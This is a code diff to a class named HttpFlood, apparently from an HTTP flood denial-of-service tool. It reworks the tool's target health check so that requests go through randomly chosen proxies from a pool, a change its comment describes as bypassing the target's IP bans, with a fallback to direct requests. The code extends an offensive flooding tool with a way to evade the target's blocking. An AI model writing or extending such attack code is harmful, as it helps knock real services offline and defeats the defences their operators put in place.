@@ -1844,10 +1844,31 @@ class HttpFlood(Thread):
         try:
             import urllib.request
             start = time()
-            req = urllib.request.Request(f"{self._target.scheme}://{self._target.authority}/")
-            req.add_header('User-Agent', 'Mozilla/5.0')
-            with urllib.request.urlopen(req, timeout=8) as resp:
-                resp.read(1024)
+            
+            # [V42] External IP Checking Mode
+            # Bypasses local IP Bans by pinging through random proxies from our verified pool
+            resp = None
+            if hasattr(self, '_proxies') and self._proxies:
+                import random
+                for _ in range(5):
+                    try:
+                        p = random.choice(self._proxies)
+                        proxy_str = f"http://{str(p)}"
+                        proxy_support = urllib.request.ProxyHandler({'http': proxy_str, 'https': proxy_str})
+                        opener = urllib.request.build_opener(proxy_support)
+                        req = urllib.request.Request(f"{self._target.scheme}://{self._target.authority}/", headers={'User-Agent': 'Mozilla/5.0'})
+                        resp = opener.open(req, timeout=5)
+                        break # Success!
+                    except:
+                        continue
+                        
+            if not resp:
+                # Fallback to direct if all proxies failed or pool empty
+                req = urllib.request.Request(f"{self._target.scheme}://{self._target.authority}/", headers={'User-Agent': 'Mozilla/5.0'})
+                resp = urllib.request.urlopen(req, timeout=5)
+                
+            with resp:
+                resp.read(512)
                 elapsed_ms = (time() - start) * 1000
                 
                 intel["health_history"].append(elapsed_ms)
